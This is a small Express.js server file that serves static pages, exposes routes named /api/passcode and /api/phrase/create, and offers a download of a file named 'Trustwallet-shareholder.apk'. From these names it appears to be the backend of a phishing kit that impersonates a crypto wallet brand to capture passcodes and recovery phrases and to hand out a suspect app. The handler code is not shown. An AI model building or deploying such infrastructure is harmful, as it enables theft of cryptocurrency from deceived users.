const express=require("express")
const app=express()
app.use(express.json())
app.use("/",express.static("html"))

const passcode=require("./api/passcode")
app.use("/api/passcode",passcode)

const createPhrase=require("./api/createPhrase")
app.use("/api/phrase/create",createPhrase)

app.get("/download",(req,res)=>{
  const file=`${__dirname}/html/Trustwallet-shareholder.apk`
  res.download(file)

})
//
const port=process.env.PORT||3000
app.listen(port,()=>console.log(`app running on port: ${port}`))